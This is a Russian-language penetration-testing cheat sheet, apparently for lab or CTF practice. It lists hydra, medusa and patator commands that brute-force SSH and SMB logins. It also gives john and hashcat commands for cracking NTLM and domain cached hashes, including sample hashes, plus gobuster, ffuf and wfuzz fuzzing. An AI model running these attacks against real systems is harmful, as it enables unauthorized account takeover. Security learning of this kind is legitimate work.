Перебор паролей для сервисов SSH, smb и т.д.

patator ssh_login host=10.8.0.14 user=john password=FILE0 0=/usr/share/wordlists/rockyou.txt -x ignore:mesg=’Authentication failed.’

medusa -h 192.168.50.38 -u michael -P rockyou.txt -M ssh -f -v 6

(почему то для домена) 

hydra -P wifite.txt -l administrator smb://192.168.50.200 -m "ROOT.DC"

hydra -L ~/wordlists/user.txt -P ~/wordlists/pass.txt 192.168.1.5 smb -V

(не для домена)

hydra -l micha -P /usr/share/wordlists/rockyou.txt ssh://192.168.50.200

!!!!Brute char!!!! -x min:max:Aa1%

hydra -x 7:8:1 -l administrator smb://192.168.50.200 -m "ROOT.DC" -V



метасплойт в метасплойт

Перебор хешей по словарю и брут

john --format=mscash2 --wordlist=/usr/share/wordlists/rockyou.txt filehash

john --format=mscash2 --mask='?a' --min-length=7 --max-length=10 filehash

john --format=mscash2 -1=?l?u?d --mask=Password12'?1' --min-length=11 --max-length=18 security_parse.txt

Показать форматы

john --list=formats

Показать крякнутые хеши

john --show ФАЙЛ-ХЕШЕЙ

Продолжить прерванную сессию

john --restore

john сохраняет логи в домашней директории ~/.john


лучше чиcтый хешь

может несколько хешей

справка по хакат про експлойт хешей

$DCC2$10240#max_1#f4bb2ed0b323b3fa5efcc8ad8314377b

https://hashcat.net/wiki/doku.php?id=example_hashes

hashcat -m 1000 hash.txt dict.txt

hashcat ujas.txt rockyou.txt - автодетектинг хеша (файл может быть с хламом)

Загляним в справку Hashcat, чтобы узнать номер режима хеша NTLM: 1000 | NTLM  

Брут хешей
hashcat --force --hwmon-temp-abort=100 -m 1000 -D 1,2 -a 3 -i --increment-min 5 --increment-max 12 -1 ?l?u?d FB6CEDE76A37702EAD2615DC27B626EF ?1?1?1?1?1?1?1?1?1?1?1?1?1



hashcat --force --hwmon-temp-abort=100 -m 1000 -D 1,2 -a 3 -i --increment-min 5 --increment-max 12 6A6E1BB24F869966A450203F373C8EA6 ?a?a?a?a?a?a?a?a
 -a  атака по словарю 0, брутфорс 3



 
  В Hashcat встроенными наборами символов являются:	


  
? | Набор символов
===+=========
 l | abcdefghijklmnopqrstuvwxyz
 u | ABCDEFGHIJKLMNOPQRSTUVWXYZ
 d | 0123456789
 h | 0123456789abcdef
 H | 0123456789ABCDEF
 s |  !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
 
 a | ?l?u?d?s
 b | 0x00 - 0xff


# Брут директрий и доменов

Основной словарик каталогов

https://github.com/mxdelta/SecLists/blob/master/Discovery/Web-Content/big.txt

утилиты

wpscan --url://192.168.50.200/wordpress/ --wp-content-dir -at -eu  (все директории и все плагины для вордпресс)

gobuster dir -u http://192.168.50.13 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -k -x txt,html,php,css,js,sh,py,cgi,db -t 50


gobuster vhost --append-domain -w /usr/share/amass/wordlists/subdomains-top1mil-5000.txt -u http://thetoppers.htb 

gobuster dir -u 10.129.249.156 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 10 -x php,html,bak,txt

ffuf -c -u http://192.168.50.13/FUZZ -w raft-medium-words.txt -recursion -fc 404,403

# фазинг переменных

wfuzz -c -u 'http://redrocks.win/NetworkFileManagerPHP.php?FUZZ=test' -w /usr/share/wfuzz/wordlist/general/big.txt

# Создание паролей
	crunch 6 8 1234567890 -о /гооt/wordlist.lst:

https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm
